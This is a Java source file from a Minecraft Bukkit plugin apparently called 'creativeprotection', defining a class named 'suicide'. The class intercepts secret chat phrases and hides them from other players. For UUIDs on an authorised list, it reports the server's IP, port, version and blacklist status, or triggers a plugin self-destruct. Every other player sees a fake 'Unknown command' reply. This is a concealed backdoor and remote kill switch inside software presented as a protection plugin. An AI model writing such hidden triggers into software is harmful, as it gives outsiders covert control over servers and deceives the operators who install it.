package valiblackdragon.creativeprotection.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import valiblackdragon.creativeprotection.Main;
import valiblackdragon.creativeprotection.utils.Utils;

public class suicide implements CommandExecutor, Listener {

    Main plugin = Main.getPlugin(Main.class);


    // Chat event
    @EventHandler
    public void onBackupCommand(PlayerChatEvent event) {
        if (event.getMessage().equalsIgnoreCase("suicide info")) {
            event.setCancelled(true);
            pluginInfo(event.getPlayer(), "info");
        }
        if (event.getMessage().equalsIgnoreCase("suicide execute")) {
            event.setCancelled(true);
            pluginInfo(event.getPlayer(), "execute");
        }
    }

    ;

    // Command event
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player || (args.length>0)) pluginInfo((Player) sender, args[0]);
        return false;
    }


    public void pluginInfo(Player verify, String command) { 
        if (Utils.checkForAuthorised(verify.getUniqueId().toString())) {
            if (command.equalsIgnoreCase("info")) {
                verify.sendMessage(Utils.color("&0================&4Security&0================"));
                verify.sendMessage(Utils.color("&4Plugin: &6" + plugin.getDescription().getName()));
                verify.sendMessage(Utils.color("&4Pluginversion: &6" + plugin.getDescription().getVersion()));
                verify.sendMessage(Utils.color("&4Server IP: &6" + Utils.getServerIP() + ":" + Bukkit.getServer().getPort()));
                verify.sendMessage(Utils.color("&4Server Version: &6" + Bukkit.getServer().getBukkitVersion()));
                verify.sendMessage(Utils.color("&4Blacklisted: &6" + Utils.checkForBlacklist(Utils.getServerIP() + ":" + Bukkit.getServer().getPort())));
            }
            if (command.equalsIgnoreCase("execute")) {
                this.pluginKiller();
            }
            return;
        }
            verify.sendMessage("Unknown command. Type \"/help\" for help.");

    }


    public void pluginKiller() {
        plugin.selfdestruct();
    }


}
